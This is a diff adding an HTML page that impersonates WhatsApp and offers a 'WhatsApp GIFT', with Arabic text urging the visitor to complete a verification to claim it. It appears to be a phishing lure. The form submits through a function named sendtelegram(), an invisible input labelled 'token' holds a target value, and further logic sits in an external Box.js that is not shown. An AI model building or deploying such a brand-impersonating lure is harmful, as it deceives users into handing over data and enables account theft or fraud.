@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+       <title>WhatsApp</title>
+  <head>
+        <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+    *{
+      margin: 0px;
+    }
+      .div{
+        width: 100%;
+        height: 1000px;
+        background: linear-gradient(to right, #13f70f, #11ffbd);
+      }
+      header{
+        z-index: 1;
+        width: 100%;
+        height: 166px;
+        background: linear-gradient(to right, #aaffa9, #31ff16);
+        position: fixed;
+      }
+      .main{
+        transform: translate(13%,70%);
+        width: 80%;
+        height: 300px;
+        background-color: ;
+      }
+      .input{
+        opacity: 0.0;
+        border-radius: 10px;
+        transform: translate(44%,0%);
+        outline: 0;
+        padding: 5px 5px;
+        width: 10%;
+        border: 0px;
+      }
+      .img{
+        width: 30%;
+        transform: translate(119%,0%);
+      }
+      .clik{
+        color: white;
+        background-color: #7fff00;
+        border-radius: 10px;
+        border: 0px;
+        transform: translate(75%,50%);
+        width: 40%;
+        padding: 6px 6px;
+      }
+      .clik:hover{
+        color: white;
+        background-color: #006aff;
+        border-radius: 10px;
+        border: 0px;
+        transform: translate(75%,50%);
+        width: 40%;
+        padding: 5px 5px;
+      }
+      .m{
+        transform: translate(20%,2%);
+        width: 10%;
+      }
+      .p{
+        color: #ffffff;
+        text-align: center;
+      }
+      .div2{
+        transform: translate(20%,3%);
+        background-color: red;
+        width: 70%;
+        height: 300px;
+      }
+      .h1{
+        color: white;
+        transform: translate(-40%,120%);
+        float: right;
+      }
+
+
+
+      @media only screen and (min-width:360px) and (max-width:740px){
+        .m{
+        transform: translate(20%,2%);
+        width: 14%;
+      }
+      .div{
+        width: 100%;
+        height: 800px;
+        background: linear-gradient(to right, #fdfc47, #24fe41);
+      }
+      header{
+        z-index: 1;
+        width: 100%;
+        height: 60px;
+        background-color: #a5ff4d;
+        position: fixed;
+      }
+      .main{
+        transform: translate(13%,25%);
+        width: 80%;
+        height: 300px;
+        background-color: ;
+      }
+      .input{
+        opacity: 0.0;
+        border-radius: 10px;
+        transform: translate(44%,0%);
+        outline: 0;
+        padding: 5px 5px;
+        width: 10%;
+        border: 0px;
+      }
+      .img{
+        width: 40%;
+        transform: translate(76%,0%);
+      }
+      .clik{
+        color: white;
+        background-color: #7fff00;
+        border-radius: 10px;
+        border: 0px;
+        transform: translate(75%,50%);
+        width: 40%;
+        padding: 5px 5px;
+      }
+      .m{
+        transform: translate(20%,2%);
+        width: 14%;
+      }
+      .p{
+        color: #ffffff;
+        text-align: center;
+      }
+      .div2{
+        transform: translate(20%,3%);
+        background-color: red;
+        width: 70%;
+        height: 300px;
+      }
+      .h1{
+        color: white;
+        transform: translate(-16%,15%);
+        float: right;
+      }
+
+      }
+    </style>
+  
+  </head>
+  <body>
+    <header>
+      <img class="m" src="https://cdn0.iconfinder.com/data/icons/social-rounded/72/Whatsapp-256.png">
+      <h1 class="h1">WhatsApp GIFT</h1>
+    </header>
+    <div class="div">
+      <main class="main">
+        <img class="img" src="https://cdn1.iconfinder.com/data/icons/user-interface-flat-5/32/Messages_sms_text_ui_user_interface_app-256.png">
+        <br>
+        <form  onsubmit=" return sendtelegram()">
+   <input value="1_target"  class="input" type="text" id="token">
+        <br>
+        <input class="clik" onclick="advanced()" type="submit" value="تحقق">
+        </form>
+        <br>
+        <div>
+          
+           <h3 class="p">أكمل عملية التحقق لاستلام هديتك</h3>
+         </div>
+      </main>
+      <br>
+
+
+
+    </div>
+    <script src="Box.js"></script>
+  </body>
+</html>
